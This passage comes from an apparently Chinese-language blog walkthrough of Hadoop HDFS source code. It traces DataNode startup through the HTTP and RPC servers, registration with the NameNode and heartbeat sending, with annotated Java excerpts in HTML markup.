class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">startInfoServer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">// SecureDataNodeStarter will bind the privileged port to the channel if</span></span><br><span class="line">  <span class="comment">// the DN is started by JSVC, pass it along.</span></span><br><span class="line">  ServerSocketChannel httpServerChannel = secureResources != <span class="keyword">null</span> ?</span><br><span class="line">      secureResources.getHttpServerChannel() : <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">  httpServer = <span class="keyword">new</span> DatanodeHttpServer(getConf(), <span class="keyword">this</span>, httpServerChannel);</span><br><span class="line">  httpServer.start();</span><br><span class="line">  <span class="keyword">if</span> (httpServer.getHttpAddress() != <span class="keyword">null</span>) &#123;</span><br><span class="line">    infoPort = httpServer.getHttpAddress().getPort();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (httpServer.getHttpsAddress() != <span class="keyword">null</span>) &#123;</span><br><span class="line">    infoSecurePort = httpServer.getHttpsAddress().getPort();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">DatanodeHttpServer</span><span class="params">(<span class="keyword">final</span> Configuration conf,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> DataNode datanode,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> ServerSocketChannel externalHttpChannel)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  </span><br><span class="line">  ... ...</span><br><span class="line">  HttpServer2.Builder builder = <span class="keyword">new</span> HttpServer2.Builder()</span><br><span class="line">      .setName(<span class="string">"datanode"</span>)</span><br><span class="line">      .setConf(confForInfoServer)</span><br><span class="line">      .setACL(<span class="keyword">new</span> AccessControlList(conf.get(DFS_ADMIN, <span class="string">" "</span>)))</span><br><span class="line">      .hostName(getHostnameForSpnegoPrincipal(confForInfoServer))</span><br><span class="line">      .addEndpoint(URI.create(<span class="string">"http://localhost:"</span> + proxyPort))</span><br><span class="line">      .setFindPort(<span class="keyword">true</span>);</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、初始化DN的RPC服务端">4、初始化DN的RPC服务端</h2><p>点击initIpcServer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initIpcServer</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  InetSocketAddress ipcAddr = NetUtils.createSocketAddr(</span><br><span class="line">      getConf().getTrimmed(DFS_DATANODE_IPC_ADDRESS_KEY));</span><br><span class="line">  </span><br><span class="line">  ... ...</span><br><span class="line">  ipcServer = <span class="keyword">new</span> RPC.Builder(getConf())</span><br><span class="line">      .setProtocol(ClientDatanodeProtocolPB<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">      .<span class="title">setInstance</span>(<span class="title">service</span>)</span></span><br><span class="line"><span class="class">      .<span class="title">setBindAddress</span>(<span class="title">ipcAddr</span>.<span class="title">getHostName</span>())</span></span><br><span class="line"><span class="class">      .<span class="title">setPort</span>(<span class="title">ipcAddr</span>.<span class="title">getPort</span>())</span></span><br><span class="line"><span class="class">      .<span class="title">setNumHandlers</span>(</span></span><br><span class="line"><span class="class">          <span class="title">getConf</span>().<span class="title">getInt</span>(<span class="title">DFS_DATANODE_HANDLER_COUNT_KEY</span>,</span></span><br><span class="line"><span class="class">              <span class="title">DFS_DATANODE_HANDLER_COUNT_DEFAULT</span>)).<span class="title">setVerbose</span>(<span class="title">false</span>)</span></span><br><span class="line"><span class="class">      .<span class="title">setSecretManager</span>(<span class="title">blockPoolTokenSecretManager</span>).<span class="title">build</span>()</span>;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5、DN向NN注册">5、DN向NN注册</h2><p>点击refreshNamenodes</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">refreshNamenodes</span><span class="params">(Configuration conf)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">synchronized</span> (refreshNamenodesLock) &#123;</span><br><span class="line">    doRefreshNamenodes(newAddressMap, newLifelineAddressMap);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doRefreshNamenodes</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Map&lt;String, Map&lt;String, InetSocketAddress&gt;&gt; addrMap,</span></span></span><br><span class="line"><span class="function"><span class="params">    Map&lt;String, Map&lt;String, InetSocketAddress&gt;&gt; lifelineAddrMap)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  ......</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">   ......</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 3. Start new nameservices</span></span><br><span class="line">    <span class="keyword">if</span> (!toAdd.isEmpty()) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (String nsToAdd : toAdd) &#123;</span><br><span class="line">        … …</span><br><span class="line">        BPOfferService bpos = createBPOS(nsToAdd, addrs, lifelineAddrs);</span><br><span class="line">        bpByNameserviceId.put(nsToAdd, bpos);</span><br><span class="line">        offerServices.add(bpos);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    startAll();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> BPOfferService <span class="title">createBPOS</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">final</span> String nameserviceId,</span></span></span><br><span class="line"><span class="function"><span class="params">    List&lt;InetSocketAddress&gt; nnAddrs,</span></span></span><br><span class="line"><span class="function"><span class="params">    List&lt;InetSocketAddress&gt; lifelineNnAddrs)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 根据NameNode个数创建对应的服务</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> BPOfferService(nameserviceId, nnAddrs, lifelineNnAddrs, dn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击startAll()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">startAll</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    UserGroupInformation.getLoginUser().doAs(</span><br><span class="line">        <span class="keyword">new</span> PrivilegedExceptionAction&lt;Object&gt;() &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (BPOfferService bpos : offerServices) &#123;</span><br><span class="line">        <span class="comment">// 启动服务</span></span><br><span class="line">              bpos.start();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (InterruptedException ex) &#123;</span><br><span class="line">    ... ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (BPServiceActor actor : bpServices) &#123;</span><br><span class="line">    actor.start();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  ... ...</span><br><span class="line">  bpThread = <span class="keyword">new</span> Thread(<span class="keyword">this</span>);</span><br><span class="line">  bpThread.setDaemon(<span class="keyword">true</span>); <span class="comment">// needed for JUnit testing</span></span><br><span class="line"><span class="comment">// 表示开启一个线程，所有查找该线程的run方法</span></span><br><span class="line">  bpThread.start();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (lifelineSender != <span class="keyword">null</span>) &#123;</span><br><span class="line">    lifelineSender.start();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ctrl + f 搜索run方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  LOG.info(<span class="keyword">this</span> + <span class="string">" starting to offer service"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="comment">// init stuff</span></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// setup storage</span></span><br><span class="line">    <span class="comment">// 向NN 注册</span></span><br><span class="line">        connectToNNAndHandshake();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException ioe) &#123;</span><br><span class="line">        <span class="comment">// Initial handshake, storage recovery or registration failed</span></span><br><span class="line">        runningState = RunningState.INIT_FAILED;</span><br><span class="line">        <span class="keyword">if</span> (shouldRetryInit()) &#123;</span><br><span class="line">          <span class="comment">// Retry until all namenode's of BPOS failed initialization</span></span><br><span class="line">          LOG.error(<span class="string">"Initialization failed for "</span> + <span class="keyword">this</span> + <span class="string">" "</span></span><br><span class="line">              + ioe.getLocalizedMessage());</span><br><span class="line">      <span class="comment">// 注册失败，5s后重试</span></span><br><span class="line">          sleepAndLogInterrupts(<span class="number">5000</span>, <span class="string">"initializing"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          runningState = RunningState.FAILED;</span><br><span class="line">          LOG.error(<span class="string">"Initialization failed for "</span> + <span class="keyword">this</span> + <span class="string">". Exiting. "</span>, ioe);</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    … …</span><br><span class="line">    <span class="keyword">while</span> (shouldRun()) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 发送心跳</span></span><br><span class="line">        offerService();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        ... ...</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">connectToNNAndHandshake</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">// get NN proxy 获取NN的RPC客户端对象</span></span><br><span class="line">  bpNamenode = dn.connectToNN(nnAddr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// First phase of the handshake with NN - get the namespace</span></span><br><span class="line">  <span class="comment">// info.</span></span><br><span class="line">  NamespaceInfo nsInfo = retrieveNamespaceInfo();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Verify that this matches the other NN in this HA pair.</span></span><br><span class="line">  <span class="comment">// This also initializes our block pool in the DN if we are</span></span><br><span class="line">  <span class="comment">// the first NN connection for this BP.</span></span><br><span class="line">  bpos.verifyAndSetNamespaceInfo(<span class="keyword">this</span>, nsInfo);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* set thread name again to include NamespaceInfo when it's available. */</span></span><br><span class="line">  <span class="keyword">this</span>.bpThread.setName(formatThreadName(<span class="string">"heartbeating"</span>, nnAddr));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 注册</span></span><br><span class="line">  register(nsInfo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DatanodeProtocolClientSideTranslatorPB <span class="title">connectToNN</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    InetSocketAddress nnAddr)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> DatanodeProtocolClientSideTranslatorPB(nnAddr, getConf());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">DatanodeProtocolClientSideTranslatorPB</span><span class="params">(InetSocketAddress nameNodeAddr,</span></span></span><br><span class="line"><span class="function"><span class="params">    Configuration conf)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  RPC.setProtocolEngine(conf, DatanodeProtocolPB<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">      <span class="title">ProtobufRpcEngine</span>.<span class="title">class</span>)</span>;</span><br><span class="line">  UserGroupInformation ugi = UserGroupInformation.getCurrentUser();</span><br><span class="line">  rpcProxy = createNamenode(nameNodeAddr, conf, ugi);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> DatanodeProtocolPB <span class="title">createNamenode</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    InetSocketAddress nameNodeAddr, Configuration conf,</span></span></span><br><span class="line"><span class="function"><span class="params">    UserGroupInformation ugi)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> RPC.getProxy(DatanodeProtocolPB<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">      <span class="title">RPC</span>.<span class="title">getProtocolVersion</span>(<span class="title">DatanodeProtocolPB</span>.<span class="title">class</span>), <span class="title">nameNodeAddr</span>, <span class="title">ugi</span>,</span></span><br><span class="line"><span class="class">      <span class="title">conf</span>, <span class="title">NetUtils</span>.<span class="title">getSocketFactory</span>(<span class="title">conf</span>, <span class="title">DatanodeProtocolPB</span>.<span class="title">class</span>))</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回，点击register</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register</span><span class="params">(NamespaceInfo nsInfo)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">// 创建注册信息</span></span><br><span class="line">  DatanodeRegistration newBpRegistration = bpos.createRegistration();</span><br><span class="line"></span><br><span class="line">  LOG.info(<span class="keyword">this</span> + <span class="string">" beginning handshake with NN"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (shouldRun()) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// Use returned registration from namenode with updated fields</span></span><br><span class="line">    <span class="comment">// 把注册信息发送给NN（DN调用接口方法，执行在NN）</span></span><br><span class="line">      newBpRegistration = bpNamenode.registerDatanode(newBpRegistration);</span><br><span class="line">      newBpRegistration.setNamespaceInfo(nsInfo);</span><br><span class="line">      bpRegistration = newBpRegistration;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(EOFException e) &#123;  <span class="comment">// namenode might have just restarted</span></span><br><span class="line">      LOG.info(<span class="string">"Problem connecting to server: "</span> + nnAddr + <span class="string">" :"</span></span><br><span class="line">          + e.getLocalizedMessage());</span><br><span class="line">      sleepAndLogInterrupts(<span class="number">1000</span>, <span class="string">"connecting to server"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(SocketTimeoutException e) &#123;  <span class="comment">// namenode is busy</span></span><br><span class="line">      LOG.info(<span class="string">"Problem connecting to server: "</span> + nnAddr);</span><br><span class="line">      sleepAndLogInterrupts(<span class="number">1000</span>, <span class="string">"connecting to server"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  … …</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到NN，搜索NameNodeRpcServer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> DatanodeRegistration <span class="title">registerDatanode</span><span class="params">(DatanodeRegistration nodeReg)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  checkNNStartup();</span><br><span class="line">  verifySoftwareVersion(nodeReg);</span><br><span class="line">  <span class="comment">// 注册DN</span></span><br><span class="line">  namesystem.registerDatanode(nodeReg);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> nodeReg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerDatanode</span><span class="params">(DatanodeRegistration nodeReg)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  writeLock();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    blockManager.registerDatanode(nodeReg);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    writeUnlock(<span class="string">"registerDatanode"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerDatanode</span><span class="params">(DatanodeRegistration nodeReg)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="keyword">assert</span> namesystem.hasWriteLock();</span><br><span class="line">  datanodeManager.registerDatanode(nodeReg);</span><br><span class="line">  bmSafeMode.checkSafeMode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerDatanode</span><span class="params">(DatanodeRegistration nodeReg)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> DisallowedDatanodeException, UnresolvedTopologyException </span>&#123;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="comment">// register new datanode 注册DN</span></span><br><span class="line">    addDatanode(nodeDescr);</span><br><span class="line">    blockManager.getBlockReportLeaseManager().register(nodeDescr);</span><br><span class="line">    <span class="comment">// also treat the registration message as a heartbeat</span></span><br><span class="line">    <span class="comment">// no need to update its timestamp</span></span><br><span class="line">    <span class="comment">// because its is done when the descriptor is created</span></span><br><span class="line">  <span class="comment">// 将DN添加到心跳管理</span></span><br><span class="line">    heartbeatManager.addDatanode(nodeDescr);</span><br><span class="line">    heartbeatManager.updateDnStat(nodeDescr);</span><br><span class="line">    incrementVersionCount(nodeReg.getSoftwareVersion());</span><br><span class="line">    startAdminOperationIfNecessary(nodeDescr);</span><br><span class="line">    success = <span class="keyword">true</span>;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addDatanode</span><span class="params">(<span class="keyword">final</span> DatanodeDescriptor node)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// To keep host2DatanodeMap consistent with datanodeMap,</span></span><br><span class="line">  <span class="comment">// remove  from host2DatanodeMap the datanodeDescriptor removed</span></span><br><span class="line">  <span class="comment">// from datanodeMap before adding node to host2DatanodeMap.</span></span><br><span class="line">  <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">    host2DatanodeMap.remove(datanodeMap.put(node.getDatanodeUuid(), node));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  networktopology.add(node); <span class="comment">// may throw InvalidTopologyException</span></span><br><span class="line">  host2DatanodeMap.add(node);</span><br><span class="line">  checkIfClusterIsNowMultiRack(node);</span><br><span class="line">  resolveUpgradeDomain(node);</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6、向NN发送心跳">6、向NN发送心跳</h2><p>点击BPServiceActor.java中的run方法中的offerService方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">offerService</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (shouldRun()) &#123;</span><br><span class="line">        ... ...</span><br><span class="line">        HeartbeatResponse resp = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (sendHeartbeat) &#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">boolean</span> requestBlockReportLease = (fullBlockReportLeaseId == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">                  scheduler.isBlockReportDue(startTime);</span><br><span class="line">          <span class="keyword">if</span> (!dn.areHeartbeatsDisabledForTests()) &#123;</span><br><span class="line">        <span class="comment">// 发送心跳信息</span></span><br><span class="line">            resp = sendHeartBeat(requestBlockReportLease);</span><br><span class="line">            <span class="keyword">assert</span> resp != <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (resp.getFullBlockReportLeaseId() != <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="keyword">if</span> (fullBlockReportLeaseId != <span class="number">0</span>) &#123;</span><br><span class="line">        ... ...</span><br><span class="line">              &#125;</span><br><span class="line">              fullBlockReportLeaseId = resp.getFullBlockReportLeaseId();</span><br><span class="line">            &#125;</span><br><span class="line">            ... ...</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ... ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">HeartbeatResponse <span class="title">sendHeartBeat</span><span class="params">(<span class="keyword">boolean</span> requestBlockReportLease)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="comment">// 通过NN的RPC客户端发送给NN</span></span><br><span class="line">  HeartbeatResponse response = bpNamenode.sendHeartbeat(bpRegistration,</span><br><span class="line">        reports,</span><br><span class="line">        dn.getFSDataset().getCacheCapacity(),</span><br><span class="line">        dn.getFSDataset().getCacheUsed(),</span><br><span class="line">        dn.getXmitsInProgress(),</span><br><span class="line">        dn.getXceiverCount(),</span><br><span class="line">        numFailedVolumes,</span><br><span class="line">        volumeFailureSummary,</span><br><span class="line">        requestBlockReportLease,</span><br><span class="line">        slowPeers,</span><br><span class="line">        slowDisks);</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到NN，搜索NameNodeRpcServer类，ctrl + f 在NameNodeRpcServer.java中搜索sendHeartbeat</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 